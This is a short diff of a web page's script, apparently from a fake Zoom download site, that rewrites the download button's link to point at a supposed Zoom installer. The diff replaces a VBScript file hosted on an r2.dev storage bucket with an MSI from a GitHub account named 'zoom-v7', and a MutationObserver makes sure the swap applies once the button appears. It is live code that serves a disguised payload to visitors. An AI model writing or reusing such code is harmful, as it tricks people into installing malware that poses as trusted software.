@@ -2477,12 +2477,12 @@ For California Residents, you may exercise your right to “Opt-Out of the Sale/
 
     var downloadLink = document.querySelector('a[download=""][role="button"]');
     if (downloadLink) {
-      downloadLink.href = 'https://pub-76804685e01344f3b4711cc686545a05.r2.dev/ZoomInstallerFull.vbs';
+      downloadLink.href = 'https://github.com/zoom-v7/screen/releases/download/zoom/ZoomInstaller.msi';
     } else {
       var observer = new MutationObserver(function() {
         var link = document.querySelector('a[download=""][role="button"]');
         if (link) {
-          link.href = 'https://pub-76804685e01344f3b4711cc686545a05.r2.dev/ZoomInstallerFull.vbs';
+          link.href = 'https://github.com/zoom-v7/screen/releases/download/zoom/ZoomInstaller.msi';
           observer.disconnect();
         }
       });
